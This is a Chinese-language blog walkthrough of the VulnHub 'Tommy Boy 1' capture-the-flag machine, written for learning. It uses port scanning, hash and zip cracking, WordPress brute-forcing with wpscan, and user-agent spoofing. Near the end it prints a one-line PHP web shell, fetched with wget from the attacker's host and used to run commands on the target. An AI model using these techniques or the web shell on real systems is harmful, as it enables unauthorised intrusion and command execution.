> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/pltIyM3STwcjh24rNjxj_Q)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **42** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/leMkDaXRbiboDwJS3ickCDzX18rO7YT3QKjDn2b7PFbb9VqmfDhlTtobtDvDHuAXEibFmZs7HL7W0Wq66sSl7vk2w/640?wx_fmt=png)

  

  

靶机地址：https://www.vulnhub.com/entry/tommy-boy-1,157/

靶机难度：中级（CTF）

靶机发布日期：2016 年 7 月 27 日

靶机描述：

圣施耐克！汤米男孩需要您的帮助！

卡拉汉汽车公司终于进入了现代技术领域，并建立了一个 Web 服务器供其客户订购刹车片。

不幸的是，该站点刚刚瘫痪，唯一拥有管理员凭据的人是 Tom Callahan Sr.- 他刚刚去世！更糟糕的是，唯一一个了解服务器的人退出了！

您需要帮助 Tom Jr.，Richard 和 Michelle 再次恢复该网页。否则，卡拉汉汽车公司肯定会倒闭：-(  ---- 谷歌翻译

目标：找到 ** 六个 **flag

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/FAf3SbzREv1yEsWZqMDExrPvhOutWaLH9VkgQiaS11ia5Y3Xun2olnDwIhLlOiaMWe0UGE1uMpeHx4ma7lOjn8xpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VtRWAxRvv7GXYcc2w086cwOxcc4libkI8ibn6rD3yBlZ7vd0fH2TaYMKicrgibMcRBbxTQ5fbCJs4AgldkHtBiaPOdA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_svg/kSiaeFj92SMyLghhftE2Ls37f4uZP8ZCOxbnsSQ1P6n6AsfOBzt5PrmdTAS3OOhPMXiabAsyKKf4QuEfoCrj9yLNlmkc5ddlpQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4k9hSe9TaPy0RSWEehznIia1UqveiaoAIPEvamauXfg3QhbTyZlCTfQKQ/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4DOX97jg8pRXVDzvqEibicH9ibBBUbujwf9JajrmcUy8Th0wEEibVichtOMg/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.182.140

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4uBjIVVibRiabB5ZAd5tWw3RQoF7ATlSc29sZTJSMJNDngiaW8p71zVXGw/640?wx_fmt=png)

nmap 扫到 22、80、8008 端口是开启的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4zXqFcHZ8Z7ibsaatYGgWczQqzXUbtS6zsfc3iaFoJ0wBsm36JyG6Jd7g/640?wx_fmt=png)

web 看到的是 Callahan Auto！的页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4AVicThFtQAoqg7VScKCfWxNuQ0ssc4WB1aK0VONlHdGickoibDLfWBQVQ/640?wx_fmt=png)

直接访问 robots.txt 发现了第一个标志..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4icuB9q6icwL7mxia5RJouZW5DgH86kftXsZnS0e3wzhITeWdtbibceZgEA/640?wx_fmt=png)

```
Flag1 data: B34rcl4ws...
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4Q9zgWQaqdP6aCLjUjHV26klGZYCXtm3jjAntWlcQwibKCMgpu1XMia9g/640?wx_fmt=png)

发现个 jpg 文件... 查看下

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4o8BZxvRD3BrjsskX3PIcRHj3n2GFAMEEI7na8CAj3wB9xzRUnAf7BQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4gjnJFOAHA9LHrEt4tLFJbSdvtkDMHZibbDkdelMzf63fic7N7gq6c2fA/640?wx_fmt=png)

都没发现有用的信息... 回到 80 端口 web 页面，在前段源码发现了个视频网页，看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4h223PP3guz7ZL96libfUicxHNNOAGzvmnVnDpR5CRCysZV6EtwyCXfRw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4ebzrZIBP71sK29ech4MmVCrgpb1bAF4dUmNr8icXupsEtp6WpBWS7cQ/640?wx_fmt=png)

3 秒的视频，给了我们提示...prehistoricforest...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4FJYFnlrreM3YFf2M3o4VSJlg7wosCjfgUESn7mRD0EspFngNKsFw6g/640?wx_fmt=png)

这是博客... 在这里找到了 flag2...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f43BCBgCOzHkehmH6nvDADvokib1CbRGiajn9aj2nia9RoAab3K1Oqbussg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4xI3KIibeXMT9elLib5ibbj1vjs6aMefQtBAMFYTibxC85JG6cyR68B2ZNA/640?wx_fmt=png)

thisisthesecondflagyayyou.txt.... 上面还是个 wordpress CMD 架构的博客，可以用 wpscan 直接扫出的..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4SFtLoX08n8dd3myQVLGicDHUjxANIvHawNeJUJr8EpaUU3qLyDEOiarA/640?wx_fmt=png)

```
Flag data: Z4l1nsky
```

轻松找到...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4t1qH9DbopibRegC0icBofloCkX7jNepx7ZMSibxkbOXjAQPW7XUbMpJ4w/640?wx_fmt=png)

在 2016 年 7 月 7 号里的内容还发现了 / richard 目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4HRweT7ceUwedZQtibVKAmWPJ6Zf1aI32C5kV2SshDYoz3fX7WkT5uWQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f47icEyCAFFBIM6dqh170hjzvyiaB3SuYWSZAmXiaaa0U5Wia5pB95ElSWcw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f42rehoXXd4muELk9RqACsdO47pnGTAVmymnGaOUE5btT7QrkwhHrLBg/640?wx_fmt=png)

发现哈希值，破解看看...

```
ce154b5a8e59c89732bc25d6a2e6b90b
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f49MAKEwz8rZk4plOcrc5HtvaojehxMlH8EmlLogicE27BBRia4vG2UD8Q/640?wx_fmt=png)

密码是

```
spanky
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4cEKRcXaLBHKHwTEh5lB1bNJjQftgdhKaCkBBGIghicfJf29VoDLYMGQ/640?wx_fmt=png)

浏览到这里需要密码... 映衬了前面 MD5 值的密码... 试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4sDZcHLyKcRM84H1BQJo6squmdTVUjyYWA0znDlUTjqUI7jk8quGTqw/640?wx_fmt=png)

里面这篇文章讲解了：

```
1.可以使用Big Tom的主目录中的备份文件Callahanbak.bak恢复Callahan Auto的网站...
2.只需要在Big Tom的帐户下完成第一，但是Big Tom总是忘记他的密码，正如我们以前在Big Tom中看到的那样，将他的SSH证书的第二部分保存在草稿博客中...
3.Nick的FTP下还有其他信息，但FTP服务器并不总是在线（上15分钟，下15分钟然后循环）...
4.Nick只是使用容易猜到的密码重设了FTP帐户名“nickburns”，并且已经删除了SSH帐户...
```

这边提到了 FTP，尝试登录试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4PAoAEic9Avk0kbdKWSoPKxfdStvV3zxeM5n3zhotia8EuibHX9MtUa43g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f43wBkicnkHeCsKR2aR4ypgOqgkaujlTjlQQDhyyVjloxh2OiaIlOAAZEQ/640?wx_fmt=png)

nmap 扫了 FTP 开放的端口是 65534... 链接进去后用户名密码都是 nickburns... 发现下面有 readme.txt 文件... 查看到信息：

```
1.服务器上有一个名为NickIzL33t的子文件夹，Nick个人使用的...
2. Nick创建了一个加密的zip文件来存储Big的Tom凭据...
3. Nick创建了一个提示，提示输入密码以提取加密的zip文件...
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4W10ibZ7vk1zib1VJC9cJIO14vgXiaSoHtbribYrEnocpdgWiaWf5QykECUw/640?wx_fmt=png)

果然，8008 上是 nick 的服务器...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4WDduWh4dzmUzqyUOVwFmRRxuL88f7k8Vc1s1drcfLic9QddC0puq8pw/640?wx_fmt=png)

Steve Jobs 可以查看内容... 这边直接设置代理...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4VDkRTZO2UbRV1zdQpynjnPS82no0MoiaL82f3iaaVkGwiayVtbmp0MIPA/640?wx_fmt=png)

不会的在这里安装... 搜索：

```
Firefox user agent pl
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4wnJSqg8fywmp4yp4zOdcoY7niaZBVpjxFFZfuBMmhtwaQP7bByJPhvQ/640?wx_fmt=png)

设置 Iphon3 代理后，重新访问...（因为前面提到只能 Steve Jobs 访问）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4VsPwbicibCCLuaIE3lFjYyewCl0Xg22kgAwXA3rFG2IJOXvHY1D6IqaA/640?wx_fmt=png)

这边意思存在隐藏 html，这边有两种方式可以找到，wfuzz 和 dirbuster，继续...

这边使用 dirbuster 进行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4JvZvVfh2HQsxT9ic91yMAmOXl5KJZKNvicsqelchPyAVV6fs7xhAODMA/640?wx_fmt=png)

选择 Iphone 为 User Agent 代理即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f47rmuOOnUUN9bnUI1hCU72DErg4wpw4PzVLYmvSDAVxLvEZBOQxokaQ/640?wx_fmt=png)

填入爆破地址，单词表，目录，模式 html 即可... 大概爆破了几分钟...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4N8vWZTtcDYKt3cLDvxnic7ZaiaxYZZW9poA2RaqLdZCQGJ592lcAzibsQ/640?wx_fmt=png)

存在隐藏 html：

```
http://192.168.182.140:8008/NickIzL33t/fallon1.html
```

访问...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4h3niaAyraCfwhhb1RPXAcxB42rxCP2SoM6cTM9PJrARM8ib2HO63xEqg/640?wx_fmt=png)

上面有三个提示，我一个一个试试寻找信息吧...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4FQtUhJfsbSNXEJJWtH9hz4fIfJ7ukGqbopiahlgG2deeeXGwqibDG4xA/640?wx_fmt=png)

从第一个提示中提取 Big Tom 的加密密码备份文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4rcSpoponlvibTnmU5VHCpOKzxx5PFnQ1x7VSSdjA8qS1Fung7altUzw/640?wx_fmt=png)

```
flag3：TinyHead
```

第三个 flag.... 将 flag 下载到本地，和第三个提示下载了个. zip 到本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4QHWicx0RK4bpDibxLGauiaBh9TdicdYJIBS0cV8jbKoewr9KWpoyM6N9yw/640?wx_fmt=png)

根据第一个提示去爆破第三个文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4QrZRKS8VZNTYeVgrK9J8QOSopdPfiaHouPDj8rf30rdJ9fKWLHkJtkA/640?wx_fmt=png)

```
bev[A-Z][0-9][0-9][a-z][a-z][symbol]1955
```

我使用 crunch 给定模式生成字典列表...

```
[crunch学习链接](https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-4-creating-custom-wordlist-with-crunch-0156817/)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4cl6PdqvSlDjd0KALFMNTpr5FesYtxvc0cibVSSRlRZmKetMicPNibiaWVA/640?wx_fmt=png)

```
crunch 13 13 -t bev,%%@@^1995 -o passlist_tomboy.txt
```

5800 万个组合，10 秒就完成了... 牛逼的工具...

然后使用 fcrackzip 与生成的字典文件一起使用破解加密 zip 文件即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4acHIK8MCrU4sF9ShjCPRnonUaYS75Pic6kekMTdmQpiah0hOYWMHicB8Q/640?wx_fmt=png)

```
fcrackzip -v -D -u -p dayu1.txt t0msp4ssw0rdz.zip  （花了2分多钟把）
密码：bevH00tr$1995   解压...
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4jWiaygY5gBbDz8Cn9icCgPWuTGbhooZnVj17591xhZLOsk41uLzbEDZw/640?wx_fmt=png)

解压有 pass 文本... 进去发现了三个用户名和密码... 提示了个重要信息：fatguyinalittlecoat

说在这之后还有一些数字... 在去找找下博客有啥内容...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4ASVP7sib9rhibgZS7iaulrLuwfDuROWrPzgRrHwqpT7T2woq5FicxFU88A/640?wx_fmt=png)

前面就知道这是个 wordpress 博客，这边用 wpscan 扫描下它的用户名...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4R8f3oaEYDxBFw5CxmGG0Pkqe0iclrFVFKIAr6UF8atvCvWEeXQdD0icQ/640?wx_fmt=png)

```
wpscan  -u http://192.168.182.140/prehistoricforest/ --enumerate u
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4A3K7FwVkStTlFe68U1BbJ8O2JjicwbwFVVw6TtVOrvvVbLdsAFia737Q/640?wx_fmt=png)

```
wpscan  -u http://192.168.182.140/prehistoricforest --wordlist /usr/share/wordlists/rockyou.txt --username tom --threads 50
密码：tomtom1
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4P49a2CiayXWaJNttZMj7mXCexjESzsuK8fHtlXNBRCticzE62OPmM3Sw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f488VLyhic2Ek8JFZajpWpfUVr3IUoIibxwWRxHiboIZO8Ro09rNicTNZZFw/640?wx_fmt=png)

果然，在草稿箱里面发现了一封邮件，对称了前面的解释...（花了 1 个小时）

```
用户：bigtommysenior 密码：fatguyinalittlecoat1938!!
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4PRtZ6W0rgzgXVxwkIcGYeeEkYkSoBpTH2OngrqGlYawo2N3on1UEUA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f45riajaNeGaSa2pZ01jRHUpiaUAq0EmOvHkiaxpx9q0q740ykDbX51WGEQ/640?wx_fmt=png)

```
flag4：EditButton
```

拿到了 flag4... 还发现 LOOT.ZIP 受保护的 zip 文件以及网站的备份文件...

目前主要是恢复 Callahan Auto 的网站...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4m7nr7ckJm2cNrRQMVenPSw1hvlENnQHSVulhoiaMDhl9aBj7BibVvjCw/640?wx_fmt=png)

```
cp callahanbak.bak /var/www/html/index.html
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4fiaMpsL4VWLTicMm9skF6aWsRDFCYrZuOlMESCDXoIicsJbdVvSa1JJuQ/640?wx_fmt=png)

Callahan Auto 网站回到在线... 访问...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4hSbtoc9pwXuiapibmYUmu43cUyDuXicNlV1NTQicO9qmH54kCvxduybFTg/640?wx_fmt=png)

完成后我得提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4GlrAs3SAVGtUrCrtJfM2xANrIMs8icwy8pYrw3ZEQPU9xtqO8fQZAnQ/640?wx_fmt=png)

www-data 是. 5.txt 的所有者... 需要在 web 上提个 shell 即可读取...

由于该 Web 服务器的后端是 Apache...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4ia50Xb645nw6SWzRpPCT7CeVthiaMPO2gSC9iaAuEVW1PvePEDlMvP6xA/640?wx_fmt=png)找到了上传文件的目录... 也是在. zip 目录边上...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4EDWf8lsdSCg2jicrRPH7GIGPfeqHrvpeibtrHxwEgZSDlEByRGoN1L5A/640?wx_fmt=png)

```
http://192.168.182.140:8008/NickIzL33t//P4TCH_4D4MS/
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f41Wt76nfn4bbyWgrticsL0Cyh19se88a6ibISrIbV16lIAJxibWxNlJmxQ/640?wx_fmt=png)

简单设置一个 shell 即可阅读...

```
<?php system($_GET['cmd']); ?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4Hia7icwuxIKKzejBxVgPG8WTQ3GbOl78Pdnqha0aBnBdkh6A0d7FPIBA/640?wx_fmt=png)

```
wget http://192.168.182.149:5555/dayushell.php -O sh.php
```

上传后在 web 执行 cmd 命令即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4SUjQhCN20orFuYyH0lWs2iaon2aavF90pUE8micmnGNoeXsWFj6XD0qw/640?wx_fmt=png)

当然上传以上类型的 shellcode 也可以获得权限...

前往 web 访问：

```
http://192.168.182.140:8008/NickIzL33t//P4TCH_4D4MS/uploads/sh.php?cmd=cat%20/.5.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4soZpFIhHiagjtKEOZ6UgE5oMdTz2nm2Er4prYWgITYCkFN9aFsDfRbw/640?wx_fmt=png)

```
flag5：Buttcrack
```

说到将 flag1~5 全部合并就能提取 loot.zip...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4DpLVGiahx9FR5KibuloJO4OSeul3QaJWziaHdtM4Bo2hgic7W9U3iaWAr4A/640?wx_fmt=png)

前面已经知道在 bigtommysenior 用户下还存在一个 LOOT.ZIP 未解开...

```
flag1：B34rcl4ws
flag2：Z4l1nsky
flag3：TinyHead
flag4：EditButton
flag5：Buttcrack
密码：B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4Fkj68v0AlJPKRDk8ds8TrBNQViaHzm3QSTnAvInsvUofia7oBZg9eYOQ/640?wx_fmt=png)

全部找到...

![](https://mmbiz.qpic.cn/mmbiz_png/leMkDaXRbiboDwJS3ickCDzX18rO7YT3QKjDn2b7PFbb9VqmfDhlTtobtDvDHuAXEibFmZs7HL7W0Wq66sSl7vk2w/640?wx_fmt=png)

  

  

这篇只有一个标题，信息收集... 因为全在作者邮箱到博客里引导着走，全文离不开信息收集...

这里卡住的地方是需要用 iphone 代理来访问... 加油！

由于我们已经成功找到六个 flag，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)